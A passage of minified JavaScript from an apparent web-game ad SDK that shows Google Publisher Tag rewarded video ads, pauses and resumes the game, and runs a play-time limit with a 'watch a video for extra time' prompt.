                    this.elements.progress.style.width = "0%"
                },
                pause: function() {},
                update: function() {
                    if (!a.B) return this.stop.call(this), !1;
                    var b = a.B.getRemainingTime(),
                        c = Math.floor(b / 60),
                        d = parseFloat(b - 60 * c).toFixed(0),
                        e = Math.floor(b / 3600); - 1 < e ? (this.elements.time.innerText = "Ad will close in: " + (e ? e + ":" : "") + c + ":" + (10 > d ? "0" : "") + d, this.elements.progress.style.width = 100 - 100 / (this.duration / b) + "%") : this.elements.time.innerText = "";
                    this.mg = requestAnimationFrame(this.update.bind(this))
                }
            },
            ek: function() {
                a.rewarded.initSlot.call(a.rewarded)
            },
            registerRewardCallbacks: function(b) {
                if (!0 === a.Za || "object" !== typeof a.options.rewarded) return !1;
                a.j(129);
                if (!a.rewarded) return !1;
                a.rewarded.init(a.options.rewarded, b);
                return a.ek
            },
            showRewardAd: function() {
                a.da && a.da.pa && a.da.pa.SendMessage(a.da.lb, "Pause");
                a.rewarded.Xe.call(a)
            },
            Fb: null,
            rewarded: {
                ha: !1,
                Fc: 30,
                Pf: 60,
                currentTime: 0,
                data: {},
                If: !1,
                time: -1,
                Hc: null,
                qd: null,
                Gc: null,
                nc: null,
                ab: null,
                Tb: null,
                Xh: null,
                aa: function() {
                    this.rewarded.container.classList.add("wgHidden")
                },
                show: function() {
                    this.rewarded.container.classList.remove("wgHidden")
                },
                dd: !1,
                cl: function() {
                    return !1
                },
                Da: null,
                container: null,
                Yh: !1,
                dl: !1,
                Gf: !0,
                qe: [],
                Lf: null,
                hash: null,
                Vg: -1,
                maxRequests: -1,
                Ud: 0,
                Lg: -1,
                Wh: null,
                bf: !1,
                init: function(b, c) {
                    var d = this;
                    c = void 0 === c ? null : c;
                    this.Wh = b.adTagURL && window.wgNetworkId ? b.adTagURL.replace("/1002212/", window.wgNetworkId) : b.adTagURL;
                    b.maxTime && (this.Fc = b.maxTime);
                    b.extraTime && (this.Pf = b.extraTime);
                    a.rewarded.Yh = !1;
                    a.rewarded.Lf = a.Ca() ? document.referrer : window.location.href;
                    a.rewarded.hash = a.hash(a.rewarded.Lf);
                    a.Gb ? this.Gb.call(a, c, b) : (a.Fb = document.createElement("script"), document.head.appendChild(a.Fb), a.Fb.addEventListener("load", function() {
                        a.Gb = !0;
                        d.Gb.call(a, c, b)
                    }), a.Fb.src = "https://securepubads.g.doubleclick.net/tag/js/gpt.js");
                    var e = {
                        url: a.rewarded.Lf,
                        qm: 0,
                        Wl: null,
                        el: !1,
                        counter: 0,
                        next: 180
                    };
                    if (a.Aa("wgRw") || 0 !== Object.keys(a.rewarded.data).length) {
                        var g = 0 < Object.keys(a.rewarded.data).length ? a.rewarded.data : JSON.parse(a.Aa("wgRw"));
                        a.rewarded.data = g;
                        a.rewarded.data[a.rewarded.hash] = g && "undefined" !== typeof g[a.rewarded.hash] ? g[a.rewarded.hash] : e
                    } else a.rewarded.data[a.rewarded.hash] = e;
                    a.vd("_wgRw_", JSON.stringify(a.rewarded.data), 24);
                    window.addEventListener("beforeunload", function() {
                        a.vd("wgRw", JSON.stringify(a.rewarded.data), 24)
                    });
                    setInterval(function() {
                        a.$d.paused || a.rewarded.Mk(10)
                    }, 1E4)
                },
                Gb: function(b, c) {
                    var d = this;
                    c && (a.j(130), this.rewarded.time = c.time, b ? (this.rewarded.Hc = b.onReady, this.rewarded.qd = b.onSuccess, this.rewarded.Gc = b.onFail, this.rewarded.nc = b.onClose, this.rewarded.ab = b.context) : (this.rewarded.Hc = c.onReady, this.rewarded.qd = c.onComplete, this.rewarded.Gc = c.onCancel, this.rewarded.nc = c.onClose, this.rewarded.ab = c.context), this.rewarded.Li.call(this));
                    "ongamerestore" === a.options.rewarded.init && this.rewarded.Ye.call(this);
                    if ("ongamerestore" !== a.options.rewarded.init) {
                        a.ra = window.googletag || {
                            cmd: []
                        };
                        a.ra.cmd.push(this.rewarded.initSlot.bind(this));
                        var e = function() {
                            if ("undefined" === typeof d.options.rewarded.maxRequests || 0 >= d.options.rewarded.maxRequests || d.rewarded.Ud > d.options.rewarded.maxRequests) return !1;
                            setTimeout(function() {
                                d.rewarded.dd || (a.j(131), d.rewarded.Ud++, d.rewarded.initSlot.call(d), e())
                            }, 2E3)
                        };
                        e()
                    }
                },
                initSlot: function() {
                    a.j(132);
                    clearInterval(a.rewarded.Lg);
                    a.ra.destroySlots([a.ra.pubads().getSlots(this.rewarded.qe)]);
                    this.rewarded.Tb = a.ra.defineOutOfPageSlot(this.rewarded.Wh, a.ra.enums.OutOfPageFormat.REWARDED).addService(a.ra.pubads());
                    if (!1 !== this.options.rewarded.useTargeting) {
                        var b;
                        if (this.options.rewarded.customParams) {
                            if (a.j(133), b = (new URLSearchParams(this.options.rewarded.customParams)).entries()) {
                                b = w$b(b);
                                for (var c = b.next(); !c.done; c = b.next()) c = c.value, this.rewarded.Tb.setTargeting(c[0], c[1]), window.googletag.pubads().setTargeting(c[0], c[1]), a.j(134, c[0], c[1])
                            }
                        } else if (a.options.customParamsMid)
                            for (a.j(135), b = (new URLSearchParams(a.options.customParamsMid)).entries(), b = w$b(b), c = b.next(); !c.done; c = b.next()) c = c.value, this.rewarded.Tb.setTargeting(c[0], [c[1]]), window.googletag.pubads().setTargeting(c[0], c[1]), a.j(136, c[0], [c[1]])
                    }!0 === this.options.rewarded.adTest && a.ra.pubads().set("adsense_test_mode", "on");
                    this.rewarded.qe.push(this.rewarded.Tb);
                    "undefined" !== typeof this.options.rewarded.disableInitialLoad && !0 === this.options.rewarded.disableInitialLoad && a.ra.pubads().disableInitialLoad();
                    a.ra.enableServices();
                    this.rewarded.ha || (this.rewarded.ha = !0, a.ra.pubads().addEventListener("rewardedSlotReady", function(d) {
                        var e = this;
                        if (d.slot !== this.rewarded.Tb) return !1;
                        "ongamerestore" === a.options.rewarded.init && this.rewarded.Ya.classList.remove("wgRwLoading");
                        a.j(137);
                        clearInterval(a.rewarded.Lg);
                        this.rewarded.Xh = d;
                        this.rewarded.dd = !0;
                        "ongamerestore" !== a.options.rewarded.init && ("function" !== typeof this.rewarded.Hc || this.rewarded.time ? -1 < this.rewarded.time ? setTimeout(function() {
                            e.rewarded.Ye.call(e)
                        }, 1E3 * this.rewarded.time) : "string" === typeof this.rewarded.Hc && a.da.pa && a.da.pa.SendMessage(a.da.lb, this.rewarded.Hc) : this.rewarded.ab ? this.rewarded.Hc.call(this, this.rewarded.Xe, this, this.rewarded.ab) : this.rewarded.Hc.call(this, this.rewarded.Xe, this));
                        a.j(138);
                        "ongamerestore" === a.options.rewarded.init && (d.slot.isEmpty ? this.rewarded.yh.call(this) : this.rewarded.Xe.call(this))
                    }.bind(this)), a.ra.pubads().addEventListener("rewardedSlotGranted", function(d) {
                        if (d.slot !== this.rewarded.Tb) return !1;
                        this.rewarded.If = !0;
                        "function" === typeof this.rewarded.qd ? this.rewarded.qd.call(this, d.cm, this.rewarded.ab) : "string" === typeof this.rewarded.qd && a.da.pa && a.da.pa.SendMessage(a.da.lb, this.rewarded.qd);
                        this.rewarded.Cj();
                        "ongamerestore" === a.options.rewarded.init && this.rewarded.Ye.call(this)
                    }.bind(this)), a.ra.pubads().addEventListener("rewardedSlotCanceled", this.rewarded.vj.bind(this)));
                    a.ra.display(this.rewarded.Tb);
                    a.ra.pubads().refresh([this.rewarded.Tb])
                },
                yh: function() {
                    "ongamerestore" === a.options.rewarded.init && this.rewarded.Ya.classList.remove("wgRwLoading");
                    a.rewarded.Fc = a.rewarded.Pf + a.rewarded.currentTime;
                    this.rewarded.Ub.innerText = (new Date(1E3 * a.rewarded.Fc)).toISOString().substr(14, 5);
                    a.ra.destroySlots(this.rewarded.qe);
                    this.rewarded.If = !1;
                    this.rewarded.container.classList.remove("wgShow");
                    this.rewarded.pc.classList.add("wgHidden");
                    this.rewarded.pc.classList.remove("wgShow");
                    this.rewarded.pc.classList.add("wgHidden");
                    this.rewarded.Da.classList.add("wgVisible");
                    this.rewarded.Da.classList.remove("wgHidden");
                    this.rewarded.Eh.call(this);
                    this.rewarded.data[this.rewarded.hash].counter += 1;
                    this.rewarded.data[this.rewarded.hash].lastRewardTime = (new Date).getTime();
                    this.rewarded.data[this.rewarded.hash].next = 3600;
                    this.rewarded.data[this.rewarded.hash].timePlayed = 0;
                    "ongamerestore" !== a.options.rewarded.init ? (this.rewarded.initSlot.call(a), this.rewarded.nc && (this.rewarded.ab ? this.rewarded.nc.call(this, this.rewarded.ab) : this.rewarded.nc.call(this))) : this.rewarded.Ye.call(this)
                },
                vj: function(b) {
                    var c = this;
                    if (b.slot !== this.rewarded.Tb) return !1;
                    "ongamerestore" === a.options.rewarded.init && this.rewarded.Ya.classList.remove("wgRwLoading");
                    window.history.replaceState({}, document.title, window.location.href.replace("#goog_rewarded", ""));
                    if (!1 === this.rewarded.If) {
                        if (this.rewarded.data[this.rewarded.hash].canceled = !0, this.Mc(!0), this.rewarded.Dk.call(this), a.ra.destroySlots(this.rewarded.qe), a.j(139), "function" === typeof this.rewarded.Gc ? (this.rewarded.ab ? this.rewarded.Gc.call(this, this.rewarded.ab) : this.rewarded.Gc.call(this), "ongamerestore" !== a.options.rewarded.init && (this.rewarded.initSlot.call(a), this.rewarded.nc && (this.rewarded.ab ? this.rewarded.nc.call(this, this.rewarded.ab) : this.rewarded.nc.call(this)))) : "string" === typeof this.rewarded.Gc && a.da.pa && (a.da.pa.SendMessage(a.da.lb, this.rewarded.Gc), "ongamerestore" !== a.options.rewarded.init && this.rewarded.initSlot.call(a)), "ongamerestore" !== a.options.rewarded.init) {
                            this.rewarded.Ud = 0;
                            var d = function() {
                                if ("undefined" === typeof c.options.rewarded.maxRequests || 0 >= c.options.rewarded.maxRequests || c.rewarded.Ud > c.options.rewarded.maxRequests) return !1;
                                setTimeout(function() {
                                    c.rewarded.dd || (a.j(140), c.rewarded.Ud++, c.rewarded.initSlot.call(c), d())
                                }, 2E3)
                            };
                            d()
                        }
                    } else this.rewarded.yh.call(this);
                    this.rewarded.dd = !1;
                    try {
                        document.activeElement.blur(), window.focus()
                    } catch (e) {}
                    a.da && a.da.pa && a.da.pa.SendMessage(a.da.lb, "Resume")
                },
                Qg: -1,
                Dk: function() {
                    a.rewarded.Qg = setTimeout(function() {
                        clearInterval(a.rewarded.Qg);
                        if (!a.rewarded.dd) {
                            a.nd.querySelector(".wgMidrollButton").classList.add("wgHidden");
                            a.xk();
                            a.Fa(!0);
                            var b = a.hash(a.Ca() ? document.referrer : window.location.href);
                            a.rewarded.data[b].canceled = !1;
                            a.rewarded.data[b].next = 180;
                            a.rewarded.dd = !1;
                            a.rewarded.Yh = !0
                        }
                    }, 5E3)
                },
                Me: -1,
                Fk: function() {
                    var b = this;
                    clearInterval(this.Me);
                    this.currentTime = this.Fc;
                    this.Me = setInterval(function() {
                        if (!0 === b.bf) return !1;
                        b.currentTime--;
                        b.Ub.innerText = (new Date(1E3 * b.currentTime)).toISOString().substr(14, 5);
                        b.Oe.style.width = 100 * b.currentTime / b.Fc + "%";
                        0 === b.currentTime && (clearInterval(b.Me), b.wg.call(a), b.Ub.innerText = (new Date(1E3 * b.Fc)).toISOString().substr(14, 5))
                    }, 1E3)
                },
                Mk: function(b) {
                    try {
                        a.rewarded.data[a.rewarded.hash].timePlayed += b
                    } catch (c) {
                        a.j(142)
                    }
                },
                pc: null,
                Kc: null,
                ud: null,
                Ya: null,
                Ub: null,
                Ne: null,
                Oe: null,
                Li: function() {
                    this.rewarded.container && this.rewarded.container.parentNode.removeChild(this.rewarded.container);
                    this.rewarded.container = document.createElement("div");
                    this.rewarded.container.classList.add("wgRwMainContainer");
                    this.rewarded.container.classList.add("wgHidden");
                    a.s(".wgHidden{ display:none !important; visibility:hidden; }");
                    a.s("@keyframes wgAnimShow { from { opacity:0 } to { opacity:1 } }");
                    a.s(".wgRwMainContainer{text-align:center; position:absolute; bottom:0; left:0; max-width:100%; max-height:100%; width:100%;}.wgRwMainContainer.wgS1{width:0px; height:0px;}.wgRwMainContainer.wgShow{animation: wgAnimShow .5s linear forwards; }.wgRwMainContainer a{-webkit-tap-highlight-color:rgba(0,0,0,0);}");
                    this.G().appendChild(this.rewarded.container);
                    var b = a.F("div", "RwBgSplash");
                    a.s("." + b.classList[0] + "{\n                        width:100%; \n                        _width:" + a.Zb.w + "px; \n                        _height:" + a.Zb.h + "px; \n                        height:0px; \n                        box-sizing: border-box; \n                        position:absolute; \n                        background:rgba(0,0,0,0);\n                        _transform:translateY(" + a.Zb.h + "px);\n                 }");
                    this.rewarded.container.appendChild(b);
                    var c = a.F("div", "rwTimerCountTitle");
                    c.innerHTML = "Play time for this game is 2 minutes, after that time you need to watch a short video to continue playing.";
                    a.s("." + c.classList[0] + "{\n                        padding: 30px;\n                        text-align: center;\n                        margin: auto;\n                        color: #fff;\n                        position: absolute;\n                        bottom: 40px;\n                        left: 20px;\n                        background: #000;\n                        border-radius: 20px;          \n                        width: 200px;\n                        font-size: 14px;\n                        display:none;            \n                    }");
                    b.appendChild(c);
                    c = a.F("div", "rwTimer");
                    a.s("." + c.classList[0] + "{                    \n                    display: grid;\n                    grid-template-columns: max-content auto;\n                    position: absolute;\n                    left: 0;\n                    bottom: 0;\n                    width: 100%;\n                    height: 15px;\n                    background: #010c1d;\n                    width:100%;\n                    box-sizing:border-box;\n                    cursor:pointer;\n                }");
                    c.addEventListener("click", this.rewarded.wg.bind(this));
                    b.appendChild(c);
                    this.rewarded.Ne = a.F("div", "rwTimerCount");
                    a.s("." + this.rewarded.Ne.classList[0] + "{\n                    width:100%;\n                    height:100%;\n                    box-sizing:border-box;\n                    border: 2px solid #f12471;\n                }");
                    this.rewarded.Oe = a.F("div", "rwTimerProgressBar");
                    a.s("." + this.rewarded.Oe.classList[0] + "{\n                    width:100%;\n                    height:100%;\n                    background:#f12471; \n                    box-sizing:border-box;\n                }");
                    this.rewarded.Ne.appendChild(this.rewarded.Oe);
                    this.rewarded.Ub = a.F("div", "rwCountDown");
                    this.rewarded.Ub.innerHTML = (new Date(1E3 * this.rewarded.Fc)).toISOString().substr(14, 5);
                    a.s("." + this.rewarded.Ub.classList[0] + "{\n                    display: flex;\n                    width: min-content;\n                    height: 100%;\n                    align-content: stretch;\n                    flex-wrap: nowrap;\n                    justify-content: center;\n                    align-items: center;\n                    background-color: #ffe21e;\n                    padding-right:10px;                  \n                    padding-left: 50px;\n                    font-size:12px;\n                }");
                    a.s("." + this.rewarded.Ub.classList[0] + ':before{\n                    content: "Time limit";\n                    display: flex;\n                    width: max-content;\n                    height: 100%;\n                    align-content: stretch;\n                    flex-wrap: nowrap;\n                    justify-content: center;\n                    align-items: center;\n                    background: #ffe21e;\n                    color: #201600;\n                    padding: 0 5px;\n                    font-size:12px;                  \n                }');
                    c.appendChild(this.rewarded.Ub);
                    c.appendChild(this.rewarded.Ne);
                    this.rewarded.Pi.call(this);
                    b = this.rewarded.pc = a.F("div", "rwOptin");
                    b.classList.add("wgHidden");
                    a.s("." + b.classList[0] + "{\n                    box-sizing:border-box; \n                    background:rgba(0,0,0,.8); \n                    position:absolute; \n                    top:0; \n                    left:0;\n                    width:100%; \n                    _width:" + a.Zb.w + "px; \n                    height:" + a.Zb.h + "px;\n                    transform:translateY(-" +
                        a.Zb.h + "px);\n                }");
                    a.s("." + b.classList[0] + ".wgShow{animation: wgAnimShow .5s linear forwards;}");
                    this.rewarded.container.appendChild(b);
                    c = a.F("div", "rwOptinButtons");
                    a.s("." + c.classList[0] + "{\n                    position:absolute; \n                    margin:auto; \n                    top:0; \n                    left:0; \n                    bottom:0; \n                    right:0; \n                    width:fit-content; \n                    height:fit-content; \n                    background:#33383e; \n                    border-radius:10px; \n                    padding:20px;\n                }");
                    a.s("." + c.classList[0] + "{\n                    align-items: center;\n                }");
                    b.appendChild(c);
                    this.rewarded.ud = a.F("div", "rwOptinClose");
                    a.s("." + this.rewarded.ud.classList[0] + "{\n                    position:absolute;\n                    top:10px;\n                    right:10px;\n                    width:50px;\n                    height:50px;\n                    background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAARCAYAAAA7bUf6AAAApklEQVQ4ja2U6w3DIAyEGSMDNKOwdLJHMwCMEekqU1uyiHNBtJb4w5lPfpIA2FkA7ABWdxcd0Tf1b7oHvPG1QkCr6lD/xSAeAALyAHhQ0hQi86AIYLY/Och9JnqV9yxUs5MBfGGfQLeAHjIKqn3RozZmksKpemKQkUgu7Z+tSYlqMtOd4rvz+mFOis3JXyZWducgAJayvGu704NGt7gB+u7M/SdA+gAeVAQapmEVswAAAABJRU5ErkJggg==);\n                    background-repeat:no-repeat;\n                    background-position: center center;\n                    cursor:pointer;\n                }");
                    this.rewarded.ud.addEventListener("click", this.rewarded.Aj.bind(this));
                    c.appendChild(this.rewarded.ud);
                    this.rewarded.Kc = a.F("div", "rwOptinTitle");
                    this.rewarded.Kc.innerHTML = "Extra time";
                    a.s("." + this.rewarded.Kc.classList[0] + "{ \n                    width: 100%;\n                    color:#fff; \n                    text-align: center;\n                    padding-bottom:20px;\n                    font-size:28px;\n                    font-weight:600;\n                }");
                    a.s("." + this.rewarded.Kc.classList[0] +
                        " span{ color:#d4c659; text-shadow: 2px 2px 2px #000; }");
                    c.appendChild(this.rewarded.Kc);
                    this.rewarded.Ya = a.F("div", "rwOptinButtonY");
                    this.rewarded.Ya.innerHTML = "Watch a video";
                    this.rewarded.Ya.addEventListener("click", this.rewarded.dk.bind(this));
                    a.s("." + this.rewarded.Ya.classList[0] + "{\n                    display: block;\n                    margin: 10px auto;\n                    cursor: pointer;\n                    position:relative;\n                    color: #fff;\n                    z-index: 1000;\n                    border-radius: 10px;\n                    background-repeat: no-repeat;\n                    background-position: 10px center;\n                    background-size: 25px;\n                    text-shadow: 1px 1px 1px #000;\n                    margin: 0 auto;\n                    padding: 30px 30px 30px 100px;\n                    font-size: 22px;\n                    background: no-repeat 10px center url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDcuMC1jMDAwIDc5LmRhYmFjYmIsIDIwMjEvMDQvMTQtMDA6Mzk6NDQgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCAyMi40IChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoxMTY3MTE4RjAwMzkxMUVDOUI3RkIyRTc3QUVDMzUyRCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoxMTY3MTE5MDAwMzkxMUVDOUI3RkIyRTc3QUVDMzUyRCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjExNjcxMThEMDAzOTExRUM5QjdGQjJFNzdBRUMzNTJEIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjExNjcxMThFMDAzOTExRUM5QjdGQjJFNzdBRUMzNTJEIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+iIetYgAAHw1JREFUeNrsXQmY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